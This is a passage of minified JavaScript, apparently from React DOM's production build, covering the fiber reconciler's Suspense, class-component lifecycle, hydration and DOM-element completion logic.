        typeof r != "function" && (xt === null ? xt = new Set([this]) : xt.add(this));
        var i = t.stack;
        this.componentDidCatch(t.value, {
            componentStack: i !== null ? i : ""
        })
    }
    ),
    n
}
function Qs(e, t, n) {
    var r = e.pingCache;
    if (r === null) {
        r = e.pingCache = new Of;
        var l = new Set;
        r.set(t, l)
    } else
        l = r.get(t),
        l === void 0 && (l = new Set,
        r.set(t, l));
    l.has(n) || (l.add(n),
    e = Kf.bind(null, e, t, n),
    t.then(e, e))
}
function Gs(e) {
    do {
        var t;
        if ((t = e.tag === 13) && (t = e.memoizedState,
        t = t !== null ? t.dehydrated !== null : !0),
        t)
            return e;
        e = e.return
    } while (e !== null);
    return null
}
function qs(e, t, n, r, l) {
    return e.mode & 1 ? (e.flags |= 65536,
    e.lanes = l,
    e) : (e === t ? e.flags |= 65536 : (e.flags |= 128,
    n.flags |= 131072,
    n.flags &= -52805,
    n.tag === 1 && (n.alternate === null ? n.tag = 17 : (t = Xe(-1, 1),
    t.tag = 2,
    yt(n, t, 1))),
    n.lanes |= 1),
    e)
}
var Df = rt.ReactCurrentOwner
  , ve = !1;
function fe(e, t, n, r) {
    t.child = e === null ? Pa(t, null, n, r) : yn(t, e.child, n, r)
}
function Ks(e, t, n, r, l) {
    n = n.render;
    var o = t.ref;
    return fn(t, l),
    r = Bi(e, t, n, r, o, l),
    n = $i(),
    e !== null && !ve ? (t.updateQueue = e.updateQueue,
    t.flags &= -2053,
    e.lanes &= ~l,
    tt(e, t, l)) : (W && n && _i(t),
    t.flags |= 1,
    fe(e, t, r, l),
    t.child)
}
function Ys(e, t, n, r, l) {
    if (e === null) {
        var o = n.type;
        return typeof o == "function" && !Yi(o) && o.defaultProps === void 0 && n.compare === null && n.defaultProps === void 0 ? (t.tag = 15,
        t.type = o,
        tc(e, t, o, r, l)) : (e = Yr(n.type, null, r, t, t.mode, l),
        e.ref = t.ref,
        e.return = t,
        t.child = e)
    }
    if (o = e.child,
    !(e.lanes & l)) {
        var i = o.memoizedProps;
        if (n = n.compare,
        n = n !== null ? n : nr,
        n(i, r) && e.ref === t.ref)
            return tt(e, t, l)
    }
    return t.flags |= 1,
    e = kt(o, r),
    e.ref = t.ref,
    e.return = t,
    t.child = e
}
function tc(e, t, n, r, l) {
    if (e !== null) {
        var o = e.memoizedProps;
        if (nr(o, r) && e.ref === t.ref)
            if (ve = !1,
            t.pendingProps = r = o,
            (e.lanes & l) !== 0)
                e.flags & 131072 && (ve = !0);
            else
                return t.lanes = e.lanes,
                tt(e, t, l)
    }
    return Go(e, t, n, r, l)
}
function nc(e, t, n) {
    var r = t.pendingProps
      , l = r.children
      , o = e !== null ? e.memoizedState : null;
    if (r.mode === "hidden")
        if (!(t.mode & 1))
            t.memoizedState = {
                baseLanes: 0,
                cachePool: null,
                transitions: null
            },
            $(sn, ke),
            ke |= n;
        else {
            if (!(n & 1073741824))
                return e = o !== null ? o.baseLanes | n : n,
                t.lanes = t.childLanes = 1073741824,
                t.memoizedState = {
                    baseLanes: e,
                    cachePool: null,
                    transitions: null
                },
                t.updateQueue = null,
                $(sn, ke),
                ke |= e,
                null;
            t.memoizedState = {
                baseLanes: 0,
                cachePool: null,
                transitions: null
            },
            r = o !== null ? o.baseLanes : n,
            $(sn, ke),
            ke |= r
        }
    else
        o !== null ? (r = o.baseLanes | n,
        t.memoizedState = null) : r = n,
        $(sn, ke),
        ke |= r;
    return fe(e, t, l, n),
    t.child
}
function rc(e, t) {
    var n = t.ref;
    (e === null && n !== null || e !== null && e.ref !== n) && (t.flags |= 512,
    t.flags |= 2097152)
}
function Go(e, t, n, r, l) {
    var o = xe(n) ? Ft : de.current;
    return o = gn(t, o),
    fn(t, l),
    n = Bi(e, t, n, r, o, l),
    r = $i(),
    e !== null && !ve ? (t.updateQueue = e.updateQueue,
    t.flags &= -2053,
    e.lanes &= ~l,
    tt(e, t, l)) : (W && r && _i(t),
    t.flags |= 1,
    fe(e, t, n, l),
    t.child)
}
function Xs(e, t, n, r, l) {
    if (xe(n)) {
        var o = !0;
        sl(t)
    } else
        o = !1;
    if (fn(t, l),
    t.stateNode === null)
        Gr(e, t),
        Za(t, n, r),
        Ho(t, n, r, l),
        r = !0;
    else if (e === null) {
        var i = t.stateNode
          , s = t.memoizedProps;
        i.props = s;
        var a = i.context
          , d = n.contextType;
        typeof d == "object" && d !== null ? d = Te(d) : (d = xe(n) ? Ft : de.current,
        d = gn(t, d));
        var h = n.getDerivedStateFromProps
          , g = typeof h == "function" || typeof i.getSnapshotBeforeUpdate == "function";
        g || typeof i.UNSAFE_componentWillReceiveProps != "function" && typeof i.componentWillReceiveProps != "function" || (s !== r || a !== d) && Hs(t, i, r, d),
        at = !1;
        var m = t.memoizedState;
        i.state = m,
        fl(t, r, i, l),
        a = t.memoizedState,
        s !== r || m !== a || ye.current || at ? (typeof h == "function" && (Wo(t, n, h, r),
        a = t.memoizedState),
        (s = at || Ws(t, n, s, r, m, a, d)) ? (g || typeof i.UNSAFE_componentWillMount != "function" && typeof i.componentWillMount != "function" || (typeof i.componentWillMount == "function" && i.componentWillMount(),
        typeof i.UNSAFE_componentWillMount == "function" && i.UNSAFE_componentWillMount()),
        typeof i.componentDidMount == "function" && (t.flags |= 4194308)) : (typeof i.componentDidMount == "function" && (t.flags |= 4194308),
        t.memoizedProps = r,
        t.memoizedState = a),
        i.props = r,
        i.state = a,
        i.context = d,
        r = s) : (typeof i.componentDidMount == "function" && (t.flags |= 4194308),
        r = !1)
    } else {
        i = t.stateNode,
        Ta(e, t),
        s = t.memoizedProps,
        d = t.type === t.elementType ? s : Oe(t.type, s),
        i.props = d,
        g = t.pendingProps,
        m = i.context,
        a = n.contextType,
        typeof a == "object" && a !== null ? a = Te(a) : (a = xe(n) ? Ft : de.current,
        a = gn(t, a));
        var x = n.getDerivedStateFromProps;
        (h = typeof x == "function" || typeof i.getSnapshotBeforeUpdate == "function") || typeof i.UNSAFE_componentWillReceiveProps != "function" && typeof i.componentWillReceiveProps != "function" || (s !== g || m !== a) && Hs(t, i, r, a),
        at = !1,
        m = t.memoizedState,
        i.state = m,
        fl(t, r, i, l);
        var w = t.memoizedState;
        s !== g || m !== w || ye.current || at ? (typeof x == "function" && (Wo(t, n, x, r),
        w = t.memoizedState),
        (d = at || Ws(t, n, d, r, m, w, a) || !1) ? (h || typeof i.UNSAFE_componentWillUpdate != "function" && typeof i.componentWillUpdate != "function" || (typeof i.componentWillUpdate == "function" && i.componentWillUpdate(r, w, a),
        typeof i.UNSAFE_componentWillUpdate == "function" && i.UNSAFE_componentWillUpdate(r, w, a)),
        typeof i.componentDidUpdate == "function" && (t.flags |= 4),
        typeof i.getSnapshotBeforeUpdate == "function" && (t.flags |= 1024)) : (typeof i.componentDidUpdate != "function" || s === e.memoizedProps && m === e.memoizedState || (t.flags |= 4),
        typeof i.getSnapshotBeforeUpdate != "function" || s === e.memoizedProps && m === e.memoizedState || (t.flags |= 1024),
        t.memoizedProps = r,
        t.memoizedState = w),
        i.props = r,
        i.state = w,
        i.context = a,
        r = d) : (typeof i.componentDidUpdate != "function" || s === e.memoizedProps && m === e.memoizedState || (t.flags |= 4),
        typeof i.getSnapshotBeforeUpdate != "function" || s === e.memoizedProps && m === e.memoizedState || (t.flags |= 1024),
        r = !1)
    }
    return qo(e, t, n, r, o, l)
}
function qo(e, t, n, r, l, o) {
    rc(e, t);
    var i = (t.flags & 128) !== 0;
    if (!r && !i)
        return l && Ds(t, n, !1),
        tt(e, t, o);
    r = t.stateNode,
    Df.current = t;
    var s = i && typeof n.getDerivedStateFromError != "function" ? null : r.render();
    return t.flags |= 1,
    e !== null && i ? (t.child = yn(t, e.child, null, o),
    t.child = yn(t, null, s, o)) : fe(e, t, s, o),
    t.memoizedState = r.state,
    l && Ds(t, n, !0),
    t.child
}
function lc(e) {
    var t = e.stateNode;
    t.pendingContext ? Os(e, t.pendingContext, t.pendingContext !== t.context) : t.context && Os(e, t.context, !1),
    Oi(e, t.containerInfo)
}
function Zs(e, t, n, r, l) {
    return vn(),
    Pi(l),
    t.flags |= 256,
    fe(e, t, n, r),
    t.child
}
var Ko = {
    dehydrated: null,
    treeContext: null,
    retryLane: 0
};
function Yo(e) {
    return {
        baseLanes: e,
        cachePool: null,
        transitions: null
    }
}
function oc(e, t, n) {
    var r = t.pendingProps, l = H.current, o = !1, i = (t.flags & 128) !== 0, s;
    if ((s = i) || (s = e !== null && e.memoizedState === null ? !1 : (l & 2) !== 0),
    s ? (o = !0,
    t.flags &= -129) : (e === null || e.memoizedState !== null) && (l |= 1),
    $(H, l & 1),
    e === null)
        return bo(t),
        e = t.memoizedState,
        e !== null && (e = e.dehydrated,
        e !== null) ? (t.mode & 1 ? e.data === "$!" ? t.lanes = 8 : t.lanes = 1073741824 : t.lanes = 1,
        null) : (i = r.children,
        e = r.fallback,
        o ? (r = t.mode,
        o = t.child,
        i = {
            mode: "hidden",
            children: i
        },
        !(r & 1) && o !== null ? (o.childLanes = 0,
        o.pendingProps = i) : o = Ml(i, r, 0, null),
        e = At(e, r, n, null),
        o.return = t,
        e.return = t,
        o.sibling = e,
        t.child = o,
        t.child.memoizedState = Yo(n),
        t.memoizedState = Ko,
        e) : Vi(t, i));
    if (l = e.memoizedState,
    l !== null && (s = l.dehydrated,
    s !== null))
        return Af(e, t, i, r, s, l, n);
    if (o) {
        o = r.fallback,
        i = t.mode,
        l = e.child,
        s = l.sibling;
        var a = {
            mode: "hidden",
            children: r.children
        };
        return !(i & 1) && t.child !== l ? (r = t.child,
        r.childLanes = 0,
        r.pendingProps = a,
        t.deletions = null) : (r = kt(l, a),
        r.subtreeFlags = l.subtreeFlags & 14680064),
        s !== null ? o = kt(s, o) : (o = At(o, i, n, null),
        o.flags |= 2),
        o.return = t,
        r.return = t,
        r.sibling = o,
        t.child = r,
        r = o,
        o = t.child,
        i = e.child.memoizedState,
        i = i === null ? Yo(n) : {
            baseLanes: i.baseLanes | n,
            cachePool: null,
            transitions: i.transitions
        },
        o.memoizedState = i,
        o.childLanes = e.childLanes & ~n,
        t.memoizedState = Ko,
        r
    }
    return o = e.child,
    e = o.sibling,
    r = kt(o, {
        mode: "visible",
        children: r.children
    }),
    !(t.mode & 1) && (r.lanes = n),
    r.return = t,
    r.sibling = null,
    e !== null && (n = t.deletions,
    n === null ? (t.deletions = [e],
    t.flags |= 16) : n.push(e)),
    t.child = r,
    t.memoizedState = null,
    r
}
function Vi(e, t) {
    return t = Ml({
        mode: "visible",
        children: t
    }, e.mode, 0, null),
    t.return = e,
    e.child = t
}
function Ir(e, t, n, r) {
    return r !== null && Pi(r),
    yn(t, e.child, null, n),
    e = Vi(t, t.pendingProps.children),
    e.flags |= 2,
    t.memoizedState = null,
    e
}
function Af(e, t, n, r, l, o, i) {
    if (n)
        return t.flags & 256 ? (t.flags &= -257,
        r = uo(Error(S(422))),
        Ir(e, t, i, r)) : t.memoizedState !== null ? (t.child = e.child,
        t.flags |= 128,
        null) : (o = r.fallback,
        l = t.mode,
        r = Ml({
            mode: "visible",
            children: r.children
        }, l, 0, null),
        o = At(o, l, i, null),
        o.flags |= 2,
        r.return = t,
        o.return = t,
        r.sibling = o,
        t.child = r,
        t.mode & 1 && yn(t, e.child, null, i),
        t.child.memoizedState = Yo(i),
        t.memoizedState = Ko,
        o);
    if (!(t.mode & 1))
        return Ir(e, t, i, null);
    if (l.data === "$!") {
        if (r = l.nextSibling && l.nextSibling.dataset,
        r)
            var s = r.dgst;
        return r = s,
        o = Error(S(419)),
        r = uo(o, r, void 0),
        Ir(e, t, i, r)
    }
    if (s = (i & e.childLanes) !== 0,
    ve || s) {
        if (r = ne,
        r !== null) {
            switch (i & -i) {
            case 4:
                l = 2;
                break;
            case 16:
                l = 8;
                break;
            case 64:
            case 128:
            case 256:
            case 512:
            case 1024:
            case 2048:
            case 4096:
            case 8192:
            case 16384:
            case 32768:
            case 65536:
            case 131072:
            case 262144:
            case 524288:
            case 1048576:
            case 2097152:
            case 4194304:
            case 8388608:
            case 16777216:
            case 33554432:
            case 67108864:
                l = 32;
                break;
            case 536870912:
                l = 268435456;
                break;
            default:
                l = 0
            }
            l = l & (r.suspendedLanes | i) ? 0 : l,
            l !== 0 && l !== o.retryLane && (o.retryLane = l,
            et(e, l),
            Be(r, e, l, -1))
        }
        return Ki(),
        r = uo(Error(S(421))),
        Ir(e, t, i, r)
    }
    return l.data === "$?" ? (t.flags |= 128,
    t.child = e.child,
    t = Yf.bind(null, e),
    l._reactRetry = t,
    null) : (e = o.treeContext,
    Se = vt(l.nextSibling),
    Ne = t,
    W = !0,
    Ae = null,
    e !== null && (_e[ze++] = Ke,
    _e[ze++] = Ye,
    _e[ze++] = Bt,
    Ke = e.id,
    Ye = e.overflow,
    Bt = t),
    t = Vi(t, r.children),
    t.flags |= 4096,
    t)
}
function Js(e, t, n) {
    e.lanes |= t;
    var r = e.alternate;
    r !== null && (r.lanes |= t),
    Vo(e.return, t, n)
}
function ao(e, t, n, r, l) {
    var o = e.memoizedState;
    o === null ? e.memoizedState = {
        isBackwards: t,
        rendering: null,
        renderingStartTime: 0,
        last: r,
        tail: n,
        tailMode: l
    } : (o.isBackwards = t,
    o.rendering = null,
    o.renderingStartTime = 0,
    o.last = r,
    o.tail = n,
    o.tailMode = l)
}
function ic(e, t, n) {
    var r = t.pendingProps
      , l = r.revealOrder
      , o = r.tail;
    if (fe(e, t, r.children, n),
    r = H.current,
    r & 2)
        r = r & 1 | 2,
        t.flags |= 128;
    else {
        if (e !== null && e.flags & 128)
            e: for (e = t.child; e !== null; ) {
                if (e.tag === 13)
                    e.memoizedState !== null && Js(e, n, t);
                else if (e.tag === 19)
                    Js(e, n, t);
                else if (e.child !== null) {
                    e.child.return = e,
                    e = e.child;
                    continue
                }
                if (e === t)
                    break e;
                for (; e.sibling === null; ) {
                    if (e.return === null || e.return === t)
                        break e;
                    e = e.return
                }
                e.sibling.return = e.return,
                e = e.sibling
            }
        r &= 1
    }
    if ($(H, r),
    !(t.mode & 1))
        t.memoizedState = null;
    else
        switch (l) {
        case "forwards":
            for (n = t.child,
            l = null; n !== null; )
                e = n.alternate,
                e !== null && pl(e) === null && (l = n),
                n = n.sibling;
            n = l,
            n === null ? (l = t.child,
            t.child = null) : (l = n.sibling,
            n.sibling = null),
            ao(t, !1, l, n, o);
            break;
        case "backwards":
            for (n = null,
            l = t.child,
            t.child = null; l !== null; ) {
                if (e = l.alternate,
                e !== null && pl(e) === null) {
                    t.child = l;
                    break
                }
                e = l.sibling,
                l.sibling = n,
                n = l,
                l = e
            }
            ao(t, !0, n, null, o);
            break;
        case "together":
            ao(t, !1, null, null, void 0);
            break;
        default:
            t.memoizedState = null
        }
    return t.child
}
function Gr(e, t) {
    !(t.mode & 1) && e !== null && (e.alternate = null,
    t.alternate = null,
    t.flags |= 2)
}
function tt(e, t, n) {
    if (e !== null && (t.dependencies = e.dependencies),
    Ut |= t.lanes,
    !(n & t.childLanes))
        return null;
    if (e !== null && t.child !== e.child)
        throw Error(S(153));
    if (t.child !== null) {
        for (e = t.child,
        n = kt(e, e.pendingProps),
        t.child = n,
        n.return = t; e.sibling !== null; )
            e = e.sibling,
            n = n.sibling = kt(e, e.pendingProps),
            n.return = t;
        n.sibling = null
    }
    return t.child
}
function Ff(e, t, n) {
    switch (t.tag) {
    case 3:
        lc(t),
        vn();
        break;
    case 5:
        Ma(t);
        break;
    case 1:
        xe(t.type) && sl(t);
        break;
    case 4:
        Oi(t, t.stateNode.containerInfo);
        break;
    case 10:
        var r = t.type._context
          , l = t.memoizedProps.value;
        $(cl, r._currentValue),
        r._currentValue = l;
        break;
    case 13:
        if (r = t.memoizedState,
        r !== null)
            return r.dehydrated !== null ? ($(H, H.current & 1),
            t.flags |= 128,
            null) : n & t.child.childLanes ? oc(e, t, n) : ($(H, H.current & 1),
            e = tt(e, t, n),
            e !== null ? e.sibling : null);
        $(H, H.current & 1);
        break;
    case 19:
        if (r = (n & t.childLanes) !== 0,
        e.flags & 128) {
            if (r)
                return ic(e, t, n);
            t.flags |= 128
        }
        if (l = t.memoizedState,
        l !== null && (l.rendering = null,
        l.tail = null,
        l.lastEffect = null),
        $(H, H.current),
        r)
            break;
        return null;
    case 22:
    case 23:
        return t.lanes = 0,
        nc(e, t, n)
    }
    return tt(e, t, n)
}
var sc, Xo, uc, ac;
sc = function(e, t) {
    for (var n = t.child; n !== null; ) {
        if (n.tag === 5 || n.tag === 6)
            e.appendChild(n.stateNode);
        else if (n.tag !== 4 && n.child !== null) {
            n.child.return = n,
            n = n.child;
            continue
        }
        if (n === t)
            break;
        for (; n.sibling === null; ) {
            if (n.return === null || n.return === t)
                return;
            n = n.return
        }
        n.sibling.return = n.return,
        n = n.sibling
    }
}
;
Xo = function() {}
;
uc = function(e, t, n, r) {
    var l = e.memoizedProps;
    if (l !== r) {
        e = t.stateNode,
        Ot(He.current);
        var o = null;
        switch (n) {
        case "input":
            l = xo(e, l),
            r = xo(e, r),
            o = [];
            break;
        case "select":
            l = G({}, l, {
                value: void 0
            }),
            r = G({}, r, {
                value: void 0
            }),
            o = [];
            break;
        case "textarea":
            l = So(e, l),
            r = So(e, r),
            o = [];
            break;
        default:
            typeof l.onClick != "function" && typeof r.onClick == "function" && (e.onclick = ol)
        }
        jo(n, r);
        var i;
        n = null;
        for (d in l)
            if (!r.hasOwnProperty(d) && l.hasOwnProperty(d) && l[d] != null)
                if (d === "style") {
                    var s = l[d];
                    for (i in s)
                        s.hasOwnProperty(i) && (n || (n = {}),
                        n[i] = "")
                } else
                    d !== "dangerouslySetInnerHTML" && d !== "children" && d !== "suppressContentEditableWarning" && d !== "suppressHydrationWarning" && d !== "autoFocus" && (Kn.hasOwnProperty(d) ? o || (o = []) : (o = o || []).push(d, null));
        for (d in r) {
            var a = r[d];
            if (s = l != null ? l[d] : void 0,
            r.hasOwnProperty(d) && a !== s && (a != null || s != null))
                if (d === "style")
                    if (s) {
                        for (i in s)
                            !s.hasOwnProperty(i) || a && a.hasOwnProperty(i) || (n || (n = {}),
                            n[i] = "");
                        for (i in a)
                            a.hasOwnProperty(i) && s[i] !== a[i] && (n || (n = {}),
                            n[i] = a[i])
                    } else
                        n || (o || (o = []),
                        o.push(d, n)),
                        n = a;
                else
                    d === "dangerouslySetInnerHTML" ? (a = a ? a.__html : void 0,
                    s = s ? s.__html : void 0,
                    a != null && s !== a && (o = o || []).push(d, a)) : d === "children" ? typeof a != "string" && typeof a != "number" || (o = o || []).push(d, "" + a) : d !== "suppressContentEditableWarning" && d !== "suppressHydrationWarning" && (Kn.hasOwnProperty(d) ? (a != null && d === "onScroll" && b("scroll", e),
                    o || s === a || (o = [])) : (o = o || []).push(d, a))
        }
        n && (o = o || []).push("style", n);
        var d = o;
        (t.updateQueue = d) && (t.flags |= 4)
    }
}
;
ac = function(e, t, n, r) {
    n !== r && (t.flags |= 4)
}
;
function Mn(e, t) {
    if (!W)
        switch (e.tailMode) {
        case "hidden":
            t = e.tail;
            for (var n = null; t !== null; )
                t.alternate !== null && (n = t),
                t = t.sibling;
            n === null ? e.tail = null : n.sibling = null;
            break;
        case "collapsed":
            n = e.tail;
            for (var r = null; n !== null; )
                n.alternate !== null && (r = n),
                n = n.sibling;
            r === null ? t || e.tail === null ? e.tail = null : e.tail.sibling = null : r.sibling = null
        }
}
function ae(e) {
    var t = e.alternate !== null && e.alternate.child === e.child
      , n = 0
      , r = 0;
    if (t)
        for (var l = e.child; l !== null; )
            n |= l.lanes | l.childLanes,
            r |= l.subtreeFlags & 14680064,
            r |= l.flags & 14680064,
            l.return = e,
            l = l.sibling;
    else
        for (l = e.child; l !== null; )
            n |= l.lanes | l.childLanes,
            r |= l.subtreeFlags,
            r |= l.flags,
            l.return = e,
            l = l.sibling;
    return e.subtreeFlags |= r,
    e.childLanes = n,
    t
}
function Bf(e, t, n) {
    var r = t.pendingProps;
    switch (zi(t),
    t.tag) {
    case 2:
    case 16:
    case 15:
    case 0:
    case 11:
    case 7:
    case 8:
    case 12:
    case 9:
    case 14:
        return ae(t),
        null;
    case 1:
        return xe(t.type) && il(),
        ae(t),
        null;
    case 3:
        return r = t.stateNode,
        xn(),
        V(ye),
        V(de),
        Ai(),
        r.pendingContext && (r.context = r.pendingContext,
        r.pendingContext = null),
        (e === null || e.child === null) && (Mr(t) ? t.flags |= 4 : e === null || e.memoizedState.isDehydrated && !(t.flags & 256) || (t.flags |= 1024,
        Ae !== null && (oi(Ae),
        Ae = null))),
        Xo(e, t),
        ae(t),
        null;
    case 5:
        Di(t);
        var l = Ot(sr.current);
        if (n = t.type,
        e !== null && t.stateNode != null)
            uc(e, t, n, r, l),
            e.ref !== t.ref && (t.flags |= 512,
            t.flags |= 2097152);
        else {
            if (!r) {
                if (t.stateNode === null)
                    throw Error(S(166));
                return ae(t),
                null
            }
            if (e = Ot(He.current),
            Mr(t)) {
                r = t.stateNode,
                n = t.type;
                var o = t.memoizedProps;
                switch (r[Ve] = t,
                r[or] = o,
                e = (t.mode & 1) !== 0,
                n) {
                case "dialog":
                    b("cancel", r),
                    b("close", r);
                    break;
                case "iframe":
                case "object":
                case "embed":
                    b("load", r);
                    break;
                case "video":
                case "audio":
                    for (l = 0; l < Bn.length; l++)
                        b(Bn[l], r);
                    break;
                case "source":
                    b("error", r);
                    break;
                case "img":
                case "image":
                case "link":
                    b("error", r),
                    b("load", r);
                    break;
                case "details":
                    b("toggle", r);
                    break;
                case "input":
                    us(r, o),
                    b("invalid", r);
                    break;
                case "select":
                    r._wrapperState = {
                        wasMultiple: !!o.multiple
                    },
                    b("invalid", r);
                    break;
                case "textarea":
                    cs(r, o),
                    b("invalid", r)
                }
                jo(n, o),
                l = null;
                for (var i in o)
                    if (o.hasOwnProperty(i)) {
                        var s = o[i];
                        i === "children" ? typeof s == "string" ? r.textContent !== s && (o.suppressHydrationWarning !== !0 && Tr(r.textContent, s, e),
                        l = ["children", s]) : typeof s == "number" && r.textContent !== "" + s && (o.suppressHydrationWarning !== !0 && Tr(r.textContent, s, e),
                        l = ["children", "" + s]) : Kn.hasOwnProperty(i) && s != null && i === "onScroll" && b("scroll", r)
                    }
                switch (n) {
                case "input":
                    Nr(r),
                    as(r, o, !0);
                    break;
                case "textarea":
                    Nr(r),
                    ds(r);
                    break;
                case "select":
                case "option":
                    break;
                default:
                    typeof o.onClick == "function" && (r.onclick = ol)
                }
                r = l,
                t.updateQueue = r,
                r !== null && (t.flags |= 4)
            } else {
                i = l.nodeType === 9 ? l : l.ownerDocument,
                e === "http://www.w3.org/1999/xhtml" && (e = Au(n)),
                e === "http://www.w3.org/1999/xhtml" ? n === "script" ? (e = i.createElement("div"),
                e.innerHTML = "<script><\/script>",
                e = e.removeChild(e.firstChild)) : typeof r.is == "string" ? e = i.createElement(n, {
                    is: r.is
                }) : (e = i.createElement(n),
                n === "select" && (i = e,
                r.multiple ? i.multiple = !0 : r.size && (i.size = r.size))) : e = i.createElementNS(e, n),
                e[Ve] = t,
                e[or] = r,
                sc(e, t, !1, !1),
                t.stateNode = e;
                e: {
                    switch (i = Co(n, r),
                    n) {
                    case "dialog":
                        b("cancel", e),
                        b("close", e),
                        l = r;
                        break;
                    case "iframe":
                    case "object":
                    case "embed":
                        b("load", e),
                        l = r;
                        break;
                    case "video":
                    case "audio":
                        for (l = 0; l < Bn.length; l++)
                            b(Bn[l], e);
                        l = r;
                        break;
                    case "source":
                        b("error", e),
                        l = r;
                        break;
                    case "img":
                    case "image":
                    case "link":
                        b("error", e),
                        b("load", e),
                        l = r;
                        break;
                    case "details":
                        b("toggle", e),
                        l = r;
                        break;
                    case "input":
                        us(e, r),
                        l = xo(e, r),
                        b("invalid", e);
                        break;
                    case "option":
                        l = r;
                        break;
                    case "select":
                        e._wrapperState = {
                            wasMultiple: !!r.multiple
                        },
                        l = G({}, r, {
                            value: void 0
                        }),
                        b("invalid", e);
                        break;
                    case "textarea":
                        cs(e, r),
                        l = So(e, r),
                        b("invalid", e);
                        break;
                    default:
                        l = r
                    }
                    jo(n, l),
                    s = l;
                    for (o in s)
                        if (s.hasOwnProperty(o)) {
                            var a = s[o];
                            o === "style" ? $u(e, a) : o === "dangerouslySetInnerHTML" ? (a = a ? a.__html : void 0,
                            a != null && Fu(e, a)) : o === "children" ? typeof a == "string" ? (n !== "textarea" || a !== "") && Yn(e, a) : typeof a == "number" && Yn(e, "" + a) : o !== "suppressContentEditableWarning" && o !== "suppressHydrationWarning" && o !== "autoFocus" && (Kn.hasOwnProperty(o) ? a != null && o === "onScroll" && b("scroll", e) : a != null && pi(e, o, a, i))
                        }
                    switch (n) {
                    case "input":
                        Nr(e),
                        as(e, r, !1);
                        break;
                    case "textarea":
                        Nr(e),
                        ds(e);
                        break;
                    case "option":
                        r.value != null && e.setAttribute("value", "" + St(r.value));
                        break;
                    case "select":
                        e.multiple = !!r.multiple,
                        o = r.value,
                        o != null ? un(e, !!r.multiple, o, !1) : r.defaultValue != null && un(e, !!r.multiple, r.defaultValue, !0);
                        break;
                    default:
                        typeof l.onClick == "function" && (e.onclick = ol)
                    }
                    switch (n) {
                    case "button":
                    case "input":
                    case "select":
                    case "textarea":
                        r = !!r.autoFocus;
                        break e;
                    case "img":
                        r = !0;
                        break e;
                    default:
                        r = !1
                    }
                }
                r && (t.flags |= 4)
            }
            t.ref !== null && (t.flags |= 512,
            t.flags |= 2097152)
        }
        return ae(t),
        null;
    case 6:
        if (e && t.stateNode != null)
            ac(e, t, e.memoizedProps, r);
        else {
            if (typeof r != "string" && t.stateNode === null)
                throw Error(S(166));
            if (n = Ot(sr.current),
            Ot(He.current),
            Mr(t)) {
                if (r = t.stateNode,
                n = t.memoizedProps,
                r[Ve] = t,
                (o = r.nodeValue !== n) && (e = Ne,
                e !== null))
                    switch (e.tag) {
                    case 3:
                        Tr(r.nodeValue, n, (e.mode & 1) !== 0);
                        break;
                    case 5:
                        e.memoizedProps.suppressHydrationWarning !== !0 && Tr(r.nodeValue, n, (e.mode & 1) !== 0)
                    }
                o && (t.flags |= 4)
            } else
                r = (n.nodeType === 9 ? n : n.ownerDocument).createTextNode(r),
                r[Ve] = t,
                t.stateNode = r
        }
        return ae(t),
        null;
    case 13:
        if (V(H),
        r = t.memoizedState,
        e === null || e.memoizedState !== null && e.memoizedState.dehydrated !== null) {
            if (W && Se !== null && t.mode & 1 && !(t.flags & 128))
                _a(),
                vn(),
                t.flags |= 98560,
                o = !1;
            else if (o = Mr(t),
            r !== null && r.dehydrated !== null) {
                if (e === null) {
                    if (!o)
                        throw Error(S(318));
                    if (o = t.memoizedState,
                    o = o !== null ? o.dehydrated : null,
                    !o)
                        throw Error(S(317));
                    o[Ve] = t
                } else
                    vn(),
                    !(t.flags & 128) && (t.memoizedState = null),
                    t.flags |= 4;
                ae(t),
                o = !1
            } else
                Ae !== null && (oi(Ae),
                Ae = null),
                o = !0;
            if (!o)
                return t.flags & 65536 ? t : null
        }
        return t.flags & 128 ? (t.lanes = n,
        t) : (r = r !== null,
        r !== (e !== null && e.memoizedState !== null) && r && (t.child.flags |= 8192,
        t.mode & 1 && (e === null || H.current & 1 ? J === 0 && (J = 3) : Ki())),
        t.updateQueue !== null && (t.flags |= 4),
        ae(t),
        null);
    case 4:
        return xn(),
        Xo(e, t),
        e === null && rr(t.stateNode.containerInfo),
        ae(t),
        null;
    case 10:
        return Mi(t.type._context),
        ae(t),
        null;
    case 17:
        return xe(t.type) && il(),
        ae(t),
        null;
    case 19:
        if (V(H),
        o = t.memoizedState,
        o === null)
            return ae(t),
            null;
        if (r = (t.flags & 128) !== 0,
        i = o.rendering,
        i === null)
            if (r)
                Mn(o, !1);
            else {
                if (J !== 0 || e !== null && e.flags & 128)
                    for (e = t.child; e !== null; ) {
                        if (i = pl(e),
                        i !== null) {
                            for (t.flags |= 128,
                            Mn(o, !1),
                            r = i.updateQueue,
                            r !== null && (t.updateQueue = r,
                            t.flags |= 4),
                            t.subtreeFlags = 0,
                            r = n,
                            n = t.child; n !== null; )
                                o = n,
                                e = r,
                                o.flags &= 14680066,
                                i = o.alternate,
                                i === null ? (o.childLanes = 0,
                                o.lanes = e,
                                o.child = null,
                                o.subtreeFlags = 0,
                                o.memoizedProps = null,
                                o.memoizedState = null,
                                o.updateQueue = null,
                                o.dependencies = null,
                                o.stateNode = null) : (o.childLanes = i.childLanes,
                                o.lanes = i.lanes,
                                o.child = i.child,
                                o.subtreeFlags = 0,
                                o.deletions = null,
                                o.memoizedProps = i.memoizedProps,
                                o.memoizedState = i.memoizedState,
                                o.updateQueue = i.updateQueue,
                                o.type = i.type,
                                e = i.dependencies,
                                o.dependencies = e === null ? null : {
                                    lanes: e.lanes,
                                    firstContext: e.firstContext
                                }),
                                n = n.sibling;
                            return $(H, H.current & 1 | 2),
                            t.child
                        }
                        e = e.sibling
                    }
                o.tail !== null && K() > kn && (t.flags |= 128,
                r = !0,
                Mn(o, !1),
                t.lanes = 4194304)
            }
        else {
            if (!r)
                if (e = pl(i),
                e !== null) {
                    if (t.flags |= 128,
                    r = !0,
                    n = e.updateQueue,
                    n !== null && (t.updateQueue = n,
                    t.flags |= 4),
                    Mn(o, !0),
                    o.tail === null && o.tailMode === "hidden" && !i.alternate && !W)
                        return ae(t),
                        null
                } else
                    2 * K() - o.renderingStartTime > kn && n !== 1073741824 && (t.flags |= 128,
                    r = !0,
                    Mn(o, !1),
                    t.lanes = 4194304);
            o.isBackwards ? (i.sibling = t.child,
            t.child = i) : (n = o.last,
            n !== null ? n.sibling = i : t.child = i,
            o.last = i)
        }
        return o.tail !== null ? (t = o.tail,
        o.rendering = t,
        o.tail = t.sibling,
        o.renderingStartTime = K(),
        t.sibling = null,
        n = H.current,
